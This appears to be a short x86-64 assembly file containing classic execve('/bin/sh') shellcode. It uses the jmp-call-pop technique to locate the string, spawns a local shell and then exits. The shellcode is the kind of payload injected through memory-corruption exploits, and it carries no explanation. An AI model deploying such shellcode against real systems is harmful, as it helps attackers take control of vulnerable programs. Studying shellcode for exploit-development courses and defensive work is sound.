global _start


_start:
	
	jmp string
code:	
	xor rdi, rdi
	pop rdi
	xor rax, rax
	mov al, 0x3b
	xor rsi, rsi ;null
	xor rdx, rdx ;null
	syscall	
	
	xor rax, rax
	add rax, 60
	xor rdi, rdi
	syscall
string:
	call code
	msg: db '/bin/sh'
